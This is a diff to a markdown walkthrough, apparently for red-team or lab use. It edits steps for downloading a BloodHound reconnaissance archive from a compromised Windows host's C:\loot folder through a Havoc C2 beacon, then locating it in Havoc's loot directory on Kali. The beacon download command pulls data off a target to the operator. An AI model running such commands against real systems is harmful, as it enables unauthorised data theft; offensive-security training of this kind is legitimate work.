@@ -111,14 +111,14 @@ In the beacon tab:
 ```
 ls
 ```
-2. Download the file:
+2. Download the file to Havoc:
 ```
 download c:\loot\YYYYMMDDHHMMSS_BloodHound.zip
 ```
 
 3. Locate the `.zip` and move it to another directory on the Kali machine:
 ```
-/home/kali/BH
+/home/kali/Havoc/Data/loot/[Date_time]/agents/[random string]/download/c:/loot/ YYYYMMDDHHMMSS_BloodHound.zip
 ```
 
 ![image](https://github.com/user-attachments/assets/dcf39b1a-7e40-468a-ad7d-81e0420ff8f2)
